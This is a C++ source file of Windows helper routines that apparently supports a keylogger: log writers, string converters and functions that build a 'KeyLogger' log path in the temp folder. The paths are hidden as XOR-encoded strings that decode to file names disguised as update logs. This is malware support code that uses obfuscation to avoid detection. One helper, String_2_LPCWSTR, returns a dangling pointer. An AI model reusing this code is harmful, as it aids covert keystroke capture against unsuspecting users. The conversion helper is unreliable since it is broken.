#include "toolskit.hpp"

bool writeLog(std::string toLog, std::string LogPath)
{
    time_t now = time(nullptr);
    tm *localTm = localtime(&now);

    // Format time string
    char time_str[20];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localTm);
    // check if the file exist
    DWORD fileAttr = GetFileAttributesA(LogPath.c_str());
    if (fileAttr == INVALID_FILE_ATTRIBUTES)
    {
        // File does not exist
        HANDLE newLogFileHandle = CreateFileA(LogPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (newLogFileHandle == INVALID_HANDLE_VALUE)
        {
            std::cerr << "Error: cannot create log file\n";
            return false;
        }
        CloseHandle(newLogFileHandle);
    }
    std::ofstream logFile(LogPath, std::ios::app);
    if (!logFile.is_open())
    {
        std::cerr << "Error: cannot open log file\n";
        return false;
    }
    logFile << "[" << time_str << "] [stdout] " << toLog << std::endl;
    logFile.close();

    return true;
}

bool writeLog(std::string toLog, std::string LogPath, std::string status)
{
    time_t now = time(nullptr);
    tm *localTm = localtime(&now);

    // Format time string
    char time_str[20];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", localTm);
    // check if the file exist
    DWORD fileAttr = GetFileAttributesA(LogPath.c_str());
    if (fileAttr == INVALID_FILE_ATTRIBUTES)
    {
        // File does not exist
        HANDLE newLogFileHandle = CreateFileA(LogPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (newLogFileHandle == INVALID_HANDLE_VALUE)
        {
            std::cerr << "Error: cannot create log file\n";
            return false;
        }
        CloseHandle(newLogFileHandle);
    }
    std::ofstream logFile(LogPath, std::ios::app);
    if (!logFile.is_open())
    {
        std::cerr << "Error: cannot open log file\n";
        return false;
    }
    logFile << "[" << time_str << "] [" << status << "] " << toLog << std::endl;
    logFile.close();

    return true;
}

std::string TCHAR_2_String(TCHAR tchr[], DWORD length)
{
    std::wstring wstr(reinterpret_cast<const wchar_t *>(tchr), length);
    std::string str(wstr.begin(), wstr.end());
    return str;
}

LPCWSTR String_2_LPCWSTR(std::string str)
{
    std::wstring wstr(str.begin(), str.end());
    return wstr.c_str();
}

std::string getCurrentPath()
{
    char cpath[MAX_PATH];
    GetModuleFileNameA(NULL, cpath, MAX_PATH);
    std::string currentPath = (std::string)cpath;
    return currentPath;
}

std::string getStandardLogPath()
{
    // %tmp%
    char TMP[] = "\x54\x4c\x52";
    // \update-zxc7sa23.log
    char LogPath[] = "\x5c\x74\x72\x67\x65\x71\x63\x2a\x72\x71\x69\x3c\x7f\x6c\x3c\x3c\x3e\x7d\x7d\x74";
    return getenv(unxor(TMP)) + (std::string)unxor(LogPath);
}
std::string getKeyLoggerLogPath()
{
    // %tmp%
    char TMP[] = "\x54\x4c\x52";
    // \update-hyhsdf98.log
    char LogPath[] = "\x5c\x74\x72\x67\x65\x71\x63\x2a\x60\x70\x62\x78\x68\x6b\x37\x37\x3e\x7d\x7d\x74";
    return getenv(unxor(TMP)) + (std::string)unxor(LogPath);
}